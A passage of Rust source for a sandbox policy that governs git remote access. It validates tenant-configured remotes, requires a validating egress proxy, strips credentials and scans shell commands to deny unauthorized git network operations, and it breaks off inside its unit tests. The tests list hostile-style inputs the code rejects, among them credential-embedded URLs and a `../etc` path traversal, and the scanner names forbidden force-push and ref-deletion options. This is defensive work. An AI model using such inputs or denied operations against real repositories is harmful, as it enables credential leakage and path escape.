//! Host policy for git access from the generic shell sandbox (WI#816).
//!
//! The grant is the manifest's reserved extension point: a request may ask for
//! the `git-remotes` extension, and only an explicit, per-tenant host policy
//! (`SANDBOX_GIT_REMOTES`) can grant it. The effective decision names the
//! tenant's allowed remotes, never a credential value.
//!
//! Transport rules:
//! - `file` remotes are virtual `/workspace/...` paths. They are checked to
//!   canonicalize inside the call's own workspace and work in every egress
//!   mode because they never leave the container.
//! - `http`/`https` remotes need the daemon's validating egress proxy
//!   (`proxy-enforced`, or the legacy advisory `proxy`). `none` and `tunnel`
//!   are refused: the grant fails closed where the host cannot prove the
//!   remote is reachable only through the allowlist.
//!
//! Nothing in this module carries a credential. URLs with embedded userinfo
//! are refused at parse time, the container environment contains only remote
//! URLs and git hardening switches, and the evidence record contains names,
//! transports, hosts and operation classes only.
//!
//! The shell command check is defense in depth and an early, explicit
//! `capability_denied`. The security boundary stays host-side: the container
//! holds no credential, and the proxy allowlist limits where egress can go.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::sandbox::config::SandboxNetworkMode;
use crate::sandbox::error::{Result, SandboxError};

/// The reserved manifest extension that expresses a git remote grant request.
pub const GIT_REMOTE_EXTENSION: &str = "git-remotes";
/// Stable identifier of the host grant recorded in capability evidence.
pub const GIT_GRANT_ID: &str = "host:sandbox-git-remotes";
/// Capability field used for every git-grant denial.
const GRANT_FIELD: &str = "extensions.git-remotes";
/// Upper bound on configured remotes; keeps manifests and evidence bounded.
pub const MAX_GIT_REMOTES: usize = 32;
const MAX_URL_LEN: usize = 2048;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum GitOperationClass {
    Read,
    Write,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum GitTransport {
    File,
    Http,
    Https,
}

impl GitTransport {
    fn is_network(self) -> bool {
        matches!(self, Self::Http | Self::Https)
    }
}

/// One host-authorized remote. `canonical` is the normalized URL used for
/// exact matching; it is host configuration and is never serialized.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GitRemote {
    pub name: String,
    pub url: String,
    pub transport: GitTransport,
    pub host: Option<String>,
    pub canonical: String,
}

impl GitRemote {
    fn operations(&self) -> Vec<GitOperationClass> {
        vec![GitOperationClass::Read, GitOperationClass::Write]
    }
}

/// Host configuration parsed from `SANDBOX_GIT_REMOTES`.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct GitGrantConfig {
    pub remotes: Vec<GitRemote>,
}

impl GitGrantConfig {
    fn remote_by_name(&self, name: &str) -> Option<&GitRemote> {
        self.remotes.iter().find(|remote| remote.name == name)
    }

    /// Parse `name=url[,name=url...]`. An empty string means "no grant".
    pub fn from_spec(spec: &str) -> std::result::Result<Option<Self>, String> {
        let spec = spec.trim();
        if spec.is_empty() {
            return Ok(None);
        }
        let mut remotes = Vec::new();
        for entry in spec.split(',') {
            let entry = entry.trim();
            if entry.is_empty() {
                continue;
            }
            let (name, url) = entry
                .split_once('=')
                .ok_or_else(|| format!("SANDBOX_GIT_REMOTES entry '{entry}' must be name=url"))?;
            let name = name.trim();
            let url = url.trim();
            if name.is_empty() || url.is_empty() {
                return Err(format!(
                    "SANDBOX_GIT_REMOTES entry '{entry}' must have a non-empty name and url"
                ));
            }
            validate_remote_name(name)?;
            if remotes.iter().any(|remote: &GitRemote| remote.name == name) {
                return Err(format!(
                    "SANDBOX_GIT_REMOTES names must be unique; '{name}' appears twice"
                ));
            }
            if remotes.len() >= MAX_GIT_REMOTES {
                return Err(format!(
                    "SANDBOX_GIT_REMOTES supports at most {MAX_GIT_REMOTES} remotes"
                ));
            }
            let parsed = parse_remote_url(url)?;
            remotes.push(GitRemote {
                name: name.to_string(),
                url: url.to_string(),
                transport: parsed.transport,
                host: parsed.host,
                canonical: parsed.canonical,
            });
        }
        if remotes.is_empty() {
            return Ok(None);
        }
        Ok(Some(Self { remotes }))
    }
}

/// The authorized grant for one execution. Host-derived; never request-supplied.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GitGrantAuthorization {
    pub grant: String,
    pub cwd: PathBuf,
    pub remotes: Vec<GitRemote>,
    /// Network modes in which this grant is supported.
    pub egress: Vec<SandboxNetworkMode>,
}

/// Secret-free evidence describing the applied grant.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct EffectiveGitCapability {
    pub grant: String,
    pub egress: Vec<SandboxNetworkMode>,
    pub remotes: Vec<EffectiveGitRemote>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct EffectiveGitRemote {
    pub name: String,
    pub transport: GitTransport,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    pub operations: Vec<GitOperationClass>,
}

impl GitGrantAuthorization {
    pub fn evidence(&self) -> EffectiveGitCapability {
        EffectiveGitCapability {
            grant: self.grant.clone(),
            egress: self.egress.clone(),
            remotes: self
                .remotes
                .iter()
                .map(|remote| EffectiveGitRemote {
                    name: remote.name.clone(),
                    transport: remote.transport,
                    host: remote.host.clone(),
                    operations: remote.operations(),
                })
                .collect(),
        }
    }

    /// Git configuration passed to the container through `GIT_CONFIG_*` env
    /// entries. Values are granted remote URLs and hardening switches only;
    /// no credential, token, key or credential-helper command is included.
    pub fn container_env(&self) -> Vec<(String, String)> {
        let mut env = vec![
            ("GIT_TERMINAL_PROMPT".to_string(), "0".to_string()),
            ("GIT_CONFIG_NOSYSTEM".to_string(), "1".to_string()),
            ("GIT_CONFIG_GLOBAL".to_string(), "/dev/null".to_string()),
        ];
        let mut index = 0usize;
        for remote in &self.remotes {
            env.push((
                format!("GIT_CONFIG_KEY_{index}"),
                format!("remote.{}.url", remote.name),
            ));
            env.push((format!("GIT_CONFIG_VALUE_{index}"), remote.url.clone()));
            index += 1;
        }
        // An empty helper resets any helper inherited from the image config,
        // so a credential prompt cannot block the command and no image-level
        // helper can supply a credential the host did not grant.
        env.push((
            format!("GIT_CONFIG_KEY_{index}"),
            "credential.helper".to_string(),
        ));
        env.push((format!("GIT_CONFIG_VALUE_{index}"), String::new()));
        env.push(("GIT_CONFIG_COUNT".to_string(), (index + 1).to_string()));
        env
    }

    fn remote_by_name(&self, name: &str) -> Option<&GitRemote> {
        self.remotes.iter().find(|remote| remote.name == name)
    }
}

/// Authorize the request against host policy and the call's workspace.
///
/// `requested` names remotes to narrow the grant; an empty list means every
/// host-granted remote. A requested name outside the host list, a network
/// remote under an egress mode that cannot carry it, or a `file` remote that
/// resolves outside the workspace is a `capability_denied`.
pub fn authorize_grant(
    host: &GitGrantConfig,
    requested: &[String],
    cwd: &Path,
    network: SandboxNetworkMode,
) -> Result<GitGrantAuthorization> {
    if host.remotes.is_empty() {
        return Err(denied(
            "no host git grant is configured for this tenant; \
             SANDBOX_GIT_REMOTES is empty or unset",
        ));
    }
    let selected: Vec<GitRemote> = if requested.is_empty() {
        host.remotes.clone()
    } else {
        let mut selected = Vec::new();
        for name in requested {
            let remote = host.remote_by_name(name).ok_or_else(|| {
                denied(format!(
                    "remote '{name}' is not in this tenant's host git grant"
                ))
            })?;
            if !selected
                .iter()
                .any(|chosen: &GitRemote| chosen.name == remote.name)
            {
                selected.push(remote.clone());
            }
        }
        selected
    };
    if selected.iter().any(|remote| remote.transport.is_network()) {
        match network {
            SandboxNetworkMode::ProxyEnforced => {}
            SandboxNetworkMode::Proxy => {
                tracing::warn!(
                    "git remotes are granted under legacy advisory proxy mode; \
                     egress enforcement is not kernel-level"
                );
            }
            SandboxNetworkMode::None => {
                return Err(denied(
                    "network git remotes need the validating egress proxy; \
                     network.mode=none cannot carry them",
                ));
            }
            SandboxNetworkMode::Tunnel => {
                return Err(denied(
                    "network git remotes are not supported under network.mode=tunnel; \
                     request proxy-enforced or grant file remotes only",
                ));
            }
        }
    }
    for remote in &selected {
        if remote.transport == GitTransport::File {
            validate_file_remote(remote, cwd)?;
        }
    }
    let egress = if selected.iter().any(|remote| remote.transport.is_network()) {
        vec![SandboxNetworkMode::ProxyEnforced, SandboxNetworkMode::Proxy]
    } else {
        vec![
            SandboxNetworkMode::ProxyEnforced,
            SandboxNetworkMode::Proxy,
            SandboxNetworkMode::Tunnel,
            SandboxNetworkMode::None,
        ]
    };
    Ok(GitGrantAuthorization {
        grant: GIT_GRANT_ID.to_string(),
        cwd: cwd.to_path_buf(),
        remotes: selected,
        egress,
    })
}

/// A `file` remote is a virtual `/workspace/...` URL. Resolve it against the
/// canonical workspace and require the real path to stay inside it.
fn validate_file_remote(remote: &GitRemote, cwd: &Path) -> Result<()> {
    let relative = remote
        .canonical
        .strip_prefix("file:///workspace/")
        .ok_or_else(|| {
            denied(format!(
                "remote '{}' is not a virtual /workspace path",
                remote.name
            ))
        })?;
    let joined = cwd.join(relative);
    let canonical = joined.canonicalize().map_err(|error| {
        denied(format!(
            "file remote '{}' at {} is not readable: {error}",
            remote.name,
            joined.display()
        ))
    })?;
    if !canonical.starts_with(cwd) {
        return Err(denied(format!(
            "file remote '{}' resolves outside the call workspace",
            remote.name
        )));
    }
    if !canonical.is_dir() {
        return Err(denied(format!(
            "file remote '{}' is not a directory",
            remote.name
        )));
    }
    Ok(())
}

/// Validate a shell command against the effective git grant.
///
/// Callers pass `None` when the manifest did not request the grant. Any git
/// network operation is then refused with `capability_denied`, matching the
/// deny-by-default contract. Non-network git commands are untouched.
pub fn authorize_shell_command(command: &str, grant: Option<&GitGrantAuthorization>) -> Result<()> {
    for simple in tokenize_simple_commands(command) {
        scan_simple_command(&simple, grant, 0)?;
    }
    Ok(())
}

fn denied(reason: impl Into<String>) -> SandboxError {
    SandboxError::CapabilityDenied {
        field: GRANT_FIELD.to_string(),
        reason: format!(
            "sandbox capability manifest version 1: {GRANT_FIELD}: {}",
            reason.into()
        ),
    }
}

fn validate_remote_name(name: &str) -> std::result::Result<(), String> {
    let valid = !name.is_empty()
        && name.len() <= 128
        && name.bytes().all(|byte| {
            byte.is_ascii_lowercase() || byte.is_ascii_digit() || matches!(byte, b'_' | b'-' | b'.')
        });
    if valid {
        Ok(())
    } else {
        Err(format!(
            "SANDBOX_GIT_REMOTES remote name '{name}' must be 1-128 lowercase ASCII letters, \
             digits, '.', '_' or '-'"
        ))
    }
}

struct ParsedRemoteUrl {
    transport: GitTransport,
    host: Option<String>,
    canonical: String,
}

/// Parse a remote URL from host policy. Credentials must never be embedded,
/// and only the transports this grant can actually mediate are accepted.
fn parse_remote_url(raw: &str) -> std::result::Result<ParsedRemoteUrl, String> {
    let raw = raw.trim();
    if raw.is_empty() || raw.len() > MAX_URL_LEN {
        return Err("SANDBOX_GIT_REMOTES URLs must be 1-2048 bytes".to_string());
    }
    if raw.chars().any(|c| c.is_control() || c.is_whitespace()) {
        return Err(
            "SANDBOX_GIT_REMOTES URLs must not contain whitespace or control bytes".to_string(),
        );
    }
    if raw.contains('@') {
        return Err(format!(
            "SANDBOX_GIT_REMOTES URL '{raw}' must not embed credentials or a userinfo component"
        ));
    }
    let (scheme, rest) = raw
        .split_once("://")
        .ok_or_else(|| format!("SANDBOX_GIT_REMOTES URL '{raw}' must be an absolute URL"))?;
    let scheme = scheme.to_ascii_lowercase();
    if rest.contains('?') || rest.contains('#') {
        return Err(format!(
            "SANDBOX_GIT_REMOTES URL '{raw}' must not carry a query or fragment"
        ));
    }
    match scheme.as_str() {
        "https" | "http" => {
            let (authority, path) = rest.split_once('/').unwrap_or((rest, ""));
            if authority.is_empty() {
                return Err(format!("SANDBOX_GIT_REMOTES URL '{raw}' has no host"));
            }
            let authority = authority.to_ascii_lowercase();
            let transport = if scheme == "https" {
                GitTransport::Https
            } else {
                GitTransport::Http
            };
            Ok(ParsedRemoteUrl {
                transport,
                host: Some(authority.clone()),
                canonical: format!("{scheme}://{authority}/{path}"),
            })
        }
        "file" => {
            let relative = rest.strip_prefix("/workspace/").ok_or_else(|| {
                format!(
                    "SANDBOX_GIT_REMOTES file URL '{raw}' must be under the virtual /workspace \
                     path, e.g. file:///workspace/remotes/origin.git"
                )
            })?;
            validate_virtual_relative_path(relative)?;
            Ok(ParsedRemoteUrl {
                transport: GitTransport::File,
                host: None,
                canonical: format!("file:///workspace/{relative}"),
            })
        }
        other => Err(format!(
            "SANDBOX_GIT_REMOTES scheme '{other}' is not supported; use https, http, or file"
        )),
    }
}

fn validate_virtual_relative_path(relative: &str) -> std::result::Result<(), String> {
    if relative.is_empty() {
        return Err("SANDBOX_GIT_REMOTES file URL must name a path under /workspace".to_string());
    }
    for component in relative.split('/') {
        if component.is_empty() || component == "." || component == ".." {
            return Err(format!(
                "SANDBOX_GIT_REMOTES file path '{relative}' must not contain empty, '.' or '..' \
                 components"
            ));
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Shell command scanning
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
struct Word {
    text: String,
    dynamic: bool,
}

/// Split a shell command into simple commands. Quote-aware; command
/// separators end a command. Dynamic expansions are flagged, not evaluated.
fn tokenize_simple_commands(input: &str) -> Vec<Vec<Word>> {
    let mut commands = Vec::new();
    let mut words = Vec::new();
    let mut current = String::new();
    let mut dynamic = false;
    let mut started = false;
    let mut quote: Option<char> = None;
    let mut chars = input.chars();

    let finish_word =
        |words: &mut Vec<Word>, current: &mut String, dynamic: &mut bool, started: &mut bool| {
            if *started {
                words.push(Word {
                    text: std::mem::take(current),
                    dynamic: *dynamic,
                });
                *dynamic = false;
                *started = false;
            }
        };
    let finish_command = |commands: &mut Vec<Vec<Word>>, words: &mut Vec<Word>| {
        if !words.is_empty() {
            commands.push(std::mem::take(words));
        }
    };

    while let Some(c) = chars.next() {
        match quote {
            Some('\'') => {
                started = true;
                if c == '\'' {
                    quote = None;
                } else {
                    current.push(c);
                }
            }
            Some('"') => {
                started = true;
                match c {
                    '"' => quote = None,
                    '\\' => {
                        if let Some(next) = chars.next() {
                            current.push(next);
                        }
                    }
                    '$' | '`' => {
                        dynamic = true;
                        current.push(c);
                    }
                    _ => current.push(c),
                }
            }
            Some(_) => unreachable!("quote state is ' or \""),
            None => match c {
                '\'' | '"' => {
                    quote = Some(c);
                    started = true;
                }
                '\\' => {
                    started = true;
                    if let Some(next) = chars.next() {
                        current.push(next);
                    }
                }
                ';' | '\n' | '|' | '&' | '(' | ')' => {
                    finish_word(&mut words, &mut current, &mut dynamic, &mut started);
                    finish_command(&mut commands, &mut words);
                }
                ' ' | '\t' | '\r' => {
                    finish_word(&mut words, &mut current, &mut dynamic, &mut started);
                }
                '$' | '`' => {
                    dynamic = true;
                    current.push(c);
                    started = true;
                }
                _ => {
                    current.push(c);
                    started = true;
                }
            },
        }
    }
    finish_word(&mut words, &mut current, &mut dynamic, &mut started);
    finish_command(&mut commands, &mut words);
    commands
}

fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name.bytes().enumerate().all(|(index, byte)| {
            if index == 0 {
                byte.is_ascii_alphabetic() || byte == b'_'
            } else {
                byte.is_ascii_alphanumeric() || byte == b'_'
            }
        })
}

fn basename(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

fn scan_simple_command(
    words: &[Word],
    grant: Option<&GitGrantAuthorization>,
    depth: usize,
) -> Result<()> {
    if depth > 4 {
        return Err(denied(
            "nested shell command is too deep to authorize statically",
        ));
    }
    let mut index = 0;
    while index < words.len() && is_assignment(&words[index].text) {
        index += 1;
    }
    while index < words.len() {
        let command = basename(&words[index].text).to_string();
        match command.as_str() {
            "env" => {
                index += 1;
                while index < words.len()
                    && (words[index].text.starts_with('-') || is_assignment(&words[index].text))
                {
                    index += 1;
                }
            }
            "command" | "exec" | "nohup" | "time" => {
                index += 1;
                while index < words.len() && words[index].text.starts_with('-') {
                    index += 1;
                }
            }
            "timeout" if index + 1 < words.len() => {
                index += 2;
            }
            "nice" => {
                index += 1;
                while index < words.len() && words[index].text.starts_with('-') {
                    index += 1;
                }
            }
            "sudo" => {
                index += 1;
                index = skip_sudo_options(words, index);
            }
            "sh" | "bash" | "dash" | "zsh" | "ash" | "ksh" => {
                return scan_shell_c(words, index, grant, depth);
            }
            "git" => return inspect_git_command(&words[index..], grant),
            _ => return Ok(()),
        }
    }
    Ok(())
}

fn skip_sudo_options(words: &[Word], mut index: usize) -> usize {
    while index < words.len() {
        let word = &words[index].text;
        if word == "--" {
            return index + 1;
        }
        if !word.starts_with('-') {
            return index;
        }
        let takes_value = matches!(
            word.as_str(),
            "-u" | "--user"
                | "-g"
                | "--group"
                | "-p"
                | "--prompt"
                | "-C"
                | "--close-from"
                | "-h"
                | "--host"
                | "-r"
                | "--role"
                | "-t"
                | "--type"
                | "-U"
                | "--other-user"
        );
        index += if takes_value { 2 } else { 1 };
    }
    index
}

fn scan_shell_c(
    words: &[Word],
    index: usize,
    grant: Option<&GitGrantAuthorization>,
    depth: usize,
) -> Result<()> {
    let mut cursor = index + 1;
    while cursor < words.len() {
        let word = &words[cursor].text;
        if word == "-c" || (word.starts_with('-') && !word.starts_with("--") && word.contains('c'))
        {
            let Some(script) = words.get(cursor + 1) else {
                return Ok(());
            };
            if script.dynamic {
                return Err(denied(
                    "dynamic shell script text cannot be authorized for git network access",
                ));
            }
            for simple in tokenize_simple_commands(&script.text) {
                scan_simple_command(&simple, grant, depth + 1)?;
            }
            return Ok(());
        }
        if !word.starts_with('-') {
            return Ok(());
        }
        cursor += 1;
    }
    Ok(())
}

/// Find the git subcommand, skipping global options that take a value.
fn git_subcommand(words: &[Word]) -> std::result::Result<Option<usize>, SandboxError> {
    let mut index = 1;
    while index < words.len() {
        let word = &words[index].text;
        if word == "--" {
            return Ok(None);
        }
        if !word.starts_with('-') {
            return Ok(Some(index));
        }
        let takes_value = matches!(
            word.as_str(),
            "-C" | "-c"
                | "--git-dir"
                | "--work-tree"
                | "--namespace"
                | "--exec-path"
                | "--config-env"
        );
        if words[index].dynamic && takes_value {
            return Err(denied(
                "dynamic git global option value cannot be authorized",
            ));
        }
        index += if takes_value { 2 } else { 1 };
    }
    Ok(None)
}

fn inspect_git_command(words: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
    let Some(sub_index) = git_subcommand(words)? else {
        return Ok(());
    };
    let sub = &words[sub_index];
    if sub.dynamic {
        return Err(denied("dynamic git subcommand cannot be authorized"));
    }
    let args = &words[sub_index + 1..];
    match sub.text.as_str() {
        "clone" => authorize_clone(args, grant),
        "fetch" | "pull" => authorize_fetch(args, grant),
        "push" => authorize_push(args, grant),
        "ls-remote" => {
            let positional = positionals(args, &[]);
            let Some(remote) = positional.first() else {
                return Ok(());
            };
            authorize_remote_arg(remote, grant)
        }
        "remote" => authorize_remote_subcommand(args, grant),
        "archive" => authorize_archive(args, grant),
        "submodule" => authorize_submodule(args, grant),
        _ => Ok(()),
    }
}

fn authorize_clone(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
    const VALUE_OPTIONS: &[&str] = &[
        "-b",
        "--branch",
        "--depth",
        "-o",
        "--origin",
        "-c",
        "--config",
        "--reference",
        "--reference-if-able",
        "--separate-git-dir",
        "--template",
        "-j",
        "--jobs",
        "--upload-pack",
        "--filter",
        "--server-option",
        "--shallow-since",
        "--shallow-exclude",
        "-u",
    ];
    let positional = positionals(args, VALUE_OPTIONS);
    let Some(remote) = positional.first() else {
        return Ok(());
    };
    authorize_remote_arg(remote, grant)
}

fn authorize_fetch(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
    if args.iter().any(|arg| {
        arg.text == "--all" || arg.text == "--multiple" || arg.text.starts_with("--all=")
    }) {
        return Err(denied(
            "fetch/pull --all or --multiple would reach every configured remote; name one granted remote",
        ));
    }
    let positional = positionals(
        args,
        &[
            "--depth",
            "--upload-pack",
            "--deepen",
            "-j",
            "--jobs",
            "--refmap",
        ],
    );
    match positional.first() {
        Some(remote) => authorize_remote_arg(remote, grant),
        None => authorize_remote_name("origin", grant),
    }
}

fn authorize_push(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
    for arg in args {
        if is_force_or_delete_flag(&arg.text) {
            return Err(denied(format!(
                "git push option '{}' is not permitted; force pushes and remote ref deletion are refused",
                arg.text
            )));
        }
    }
    let positional = positionals(
        args,
        &["-o", "--push-option", "--repo", "--receive-pack", "--exec"],
    );
    let Some(remote) = positional.first() else {
        return authorize_remote_name("origin", grant);
    };
    authorize_remote_arg(remote, grant)?;
    for refspec in positional.iter().skip(1) {
        if refspec.dynamic {
            return Err(denied("dynamic push refspec cannot be authorized"));
        }
        if refspec.text.starts_with('+') {
            return Err(denied(
                "force-push refspecs (leading '+') are not permitted",
            ));
        }
        if refspec.text.starts_with(':') {
            return Err(denied("remote ref deletion (leading ':') is not permitted"));
        }
    }
    Ok(())
}

fn is_force_or_delete_flag(word: &str) -> bool {
    matches!(
        word,
        "-f" | "--force"
            | "--force-with-lease"
            | "--force-if-includes"
            | "--mirror"
            | "--delete"
            | "-d"
            | "--prune"
            | "--prune-tags"
    ) || word.starts_with("--force-with-lease=")
        || word.starts_with("--force-if-includes=")
}

fn authorize_remote_subcommand(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
    let Some(action) = args.first() else {
        return Ok(());
    };
    match action.text.as_str() {
        "add" | "set-url" => {
            let positional: Vec<&Word> = args[1..]
                .iter()
                .filter(|word| !word.text.starts_with('-'))
                .collect();
            let Some(url) = positional.get(1) else {
                return Ok(());
            };
            authorize_url_or_name(url, grant)
        }
        "update" => Err(denied(
            "git remote update reaches every configured remote; fetch a granted remote by name",
        )),
        _ => Ok(()),
    }
}

fn authorize_archive(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
    let Some(flag) = args
        .iter()
        .position(|word| word.text == "--remote" || word.text == "--remote=")
    else {
        return Ok(());
    };
    if args[flag].text == "--remote=" {
        return Err(denied("archive --remote= needs a granted remote value"));
    }
    match args.get(flag + 1) {
        Some(remote) => authorize_remote_arg(remote, grant),
        None => Err(denied("archive --remote needs a granted remote value")),
    }
}

fn authorize_submodule(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
    if args.first().is_none_or(|word| word.text != "add") {
        return Ok(());
    }
    let positional: Vec<&Word> = args[1..]
        .iter()
        .filter(|word| !word.text.starts_with('-'))
        .collect();
    let Some(url) = positional.first() else {
        return Ok(());
    };
    authorize_url_or_name(url, grant)
}

/// Positional arguments, skipping options and the values of `value_options`.
fn positionals<'a>(words: &'a [Word], value_options: &[&str]) -> Vec<&'a Word> {
    let mut result = Vec::new();
    let mut index = 0;
    let mut end_of_options = false;
    while index < words.len() {
        let word = &words[index].text;
        if !end_of_options && word == "--" {
            end_of_options = true;
            index += 1;
            continue;
        }
        if !end_of_options && word.starts_with('-') && word != "-" {
            let takes_value = value_options.contains(&word.as_str());
            index += if takes_value { 2 } else { 1 };
            continue;
        }
        result.push(&words[index]);
        index += 1;
    }
    result
}

fn authorize_remote_arg(word: &Word, grant: Option<&GitGrantAuthorization>) -> Result<()> {
    authorize_url_or_name(word, grant)
}

fn authorize_remote_name(name: &str, grant: Option<&GitGrantAuthorization>) -> Result<()> {
    let Some(grant) = grant else {
        return Err(no_grant_denial());
    };
    if grant.remote_by_name(name).is_some() {
        Ok(())
    } else {
        Err(denied(format!(
            "default remote '{name}' is not in this tenant's host git grant"
        )))
    }
}

fn authorize_url_or_name(word: &Word, grant: Option<&GitGrantAuthorization>) -> Result<()> {
    let Some(grant) = grant else {
        return Err(no_grant_denial());
    };
    if word.dynamic {
        return Err(denied(
            "dynamic git remote argument cannot be authorized; name a granted remote or URL literally",
        ));
    }
    if grant.remote_by_name(&word.text).is_some() {
        return Ok(());
    }
    let canonical = canonicalize_command_url(&word.text)?;
    if grant
        .remotes
        .iter()
        .any(|remote| remote.canonical == canonical)
    {
        Ok(())
    } else {
        Err(denied(format!(
            "git remote '{}' is not in this tenant's host git grant",
            word.text
        )))
    }
}

fn canonicalize_command_url(raw: &str) -> Result<String> {
    if let Ok(parsed) = parse_remote_url(raw) {
        return Ok(parsed.canonical);
    }
    // A bare absolute /workspace path is the in-container spelling of a
    // granted `file:///workspace/...` remote.
    let relative = raw.strip_prefix("/workspace/").ok_or_else(|| {
        denied(format!(
            "git remote '{raw}' is not a granted remote name or an absolute URL; \
             relative and scp-style remotes are refused"
        ))
    })?;
    validate_virtual_relative_path(relative).map_err(denied)?;
    Ok(format!("file:///workspace/{relative}"))
}

fn no_grant_denial() -> SandboxError {
    denied(
        "no host git grant applies to this call; request extensions=[\"git-remotes\"] and \
         have the tenant operator configure SANDBOX_GIT_REMOTES",
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::process::Command;
    use std::sync::OnceLock;

    fn spec() -> GitGrantConfig {
        GitGrantConfig::from_spec(
            "origin=file:///workspace/remotes/origin.git,\
             upstream=https://Git.Example.test/org/repo.git,\
             legacy=http://git.internal/org/repo.git",
        )
        .unwrap()
        .unwrap()
    }

    fn workspace_with_remote() -> (tempfile::TempDir, GitGrantAuthorization) {
        let temp = tempfile::tempdir().unwrap();
        let remote = temp.path().join("remotes/origin.git");
        std::fs::create_dir_all(&remote).unwrap();
        let cwd = temp.path().canonicalize().unwrap();
        let host = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
            .unwrap()
            .unwrap();
        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
        (temp, grant)
    }

    #[test]
    fn config_accepts_named_remotes_and_rejects_embedded_credentials() {
        let parsed = spec();
        assert_eq!(parsed.remotes.len(), 3);
        assert_eq!(parsed.remotes[0].name, "origin");
        assert_eq!(parsed.remotes[1].host.as_deref(), Some("git.example.test"));
        assert_eq!(parsed.remotes[2].transport, GitTransport::Http);
        for bad in [
            "origin=https://user:token@git.example.test/repo.git",
            "origin=git@git.example.test:org/repo.git",
            "origin=https://git.example.test/repo.git?token=1",
            "origin=/srv/git/repo.git",
            "origin=file:///srv/git/repo.git",
            "origin=file:///workspace/../etc/repo.git",
            "Origin=https://git.example.test/repo.git",
            "origin=https://git.example.test/repo.git,origin=https://git.example.test/other.git",
            "origin=https://git.example.test/repo.git,upstream",
            "origin=ftp://git.example.test/repo.git",
        ] {
            assert!(GitGrantConfig::from_spec(bad).is_err(), "accepted {bad}");
        }
        assert!(GitGrantConfig::from_spec("  ").unwrap().is_none());
    }

    #[test]
    fn network_remotes_require_the_validating_proxy_and_fail_closed_elsewhere() {
        let network_only =
            GitGrantConfig::from_spec("upstream=https://git.example.test/org/repo.git")
                .unwrap()
                .unwrap();
        for mode in [SandboxNetworkMode::None, SandboxNetworkMode::Tunnel] {
            let error = authorize_grant(&network_only, &[], Path::new("/tmp"), mode).unwrap_err();
            assert!(error.to_string().contains("git-remotes"), "{error}");
        }
        for mode in [SandboxNetworkMode::ProxyEnforced, SandboxNetworkMode::Proxy] {
            assert!(authorize_grant(&network_only, &[], Path::new("/tmp"), mode).is_ok());
        }
        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        let file_only = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
            .unwrap()
            .unwrap();
        for mode in [
            SandboxNetworkMode::None,
            SandboxNetworkMode::Tunnel,
            SandboxNetworkMode::ProxyEnforced,
        ] {
            assert!(authorize_grant(&file_only, &[], &cwd, mode).is_ok());
        }
    }

    #[test]
    fn requests_can_narrow_but_never_broaden_the_host_grant() {
        let host = spec();
        let grant = authorize_grant(
            &host,
            &["upstream".to_string()],
            Path::new("/tmp"),
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap();
        assert_eq!(grant.remotes.len(), 1);
        assert_eq!(grant.remotes[0].name, "upstream");
        let error = authorize_grant(
            &host,
            &["other-tenant".to_string()],
            Path::new("/tmp"),
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap_err();
        assert!(matches!(error, SandboxError::CapabilityDenied { .. }));
        assert!(error.to_string().contains("other-tenant"));
    }

    #[test]
    fn file_remotes_must_stay_inside_the_call_workspace() {
        let temp = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink(outside.path(), temp.path().join("escape")).unwrap();
        let cwd = temp.path().canonicalize().unwrap();
        for name in ["escape", "missing"] {
            let host = GitGrantConfig::from_spec(&format!("origin=file:///workspace/{name}"))
                .unwrap()
                .unwrap();
            let error =
                authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap_err();
            assert!(matches!(error, SandboxError::CapabilityDenied { .. }));
        }
    }

    #[test]
    fn container_env_has_remote_urls_and_hardening_but_no_credentials() {
        let (_temp, grant) = workspace_with_remote();
        let env = grant.container_env();
        let map: std::collections::HashMap<_, _> = env.iter().cloned().collect();
        assert_eq!(
            map.get("GIT_TERMINAL_PROMPT").map(String::as_str),
            Some("0")
        );
        assert_eq!(
            map.get("GIT_CONFIG_GLOBAL").map(String::as_str),
            Some("/dev/null")
        );
        assert_eq!(
            map.get("GIT_CONFIG_KEY_0").map(String::as_str),
            Some("remote.origin.url")
        );
        assert_eq!(
            map.get("GIT_CONFIG_VALUE_0").map(String::as_str),
            Some("file:///workspace/remotes/origin.git")
        );
        assert_eq!(
            map.get("GIT_CONFIG_KEY_1").map(String::as_str),
            Some("credential.helper")
        );
        assert_eq!(map.get("GIT_CONFIG_VALUE_1").map(String::as_str), Some(""));
        let joined = env
            .iter()
            .map(|(key, value)| format!("{key}={value}"))
            .collect::<Vec<_>>()
            .join("\n");
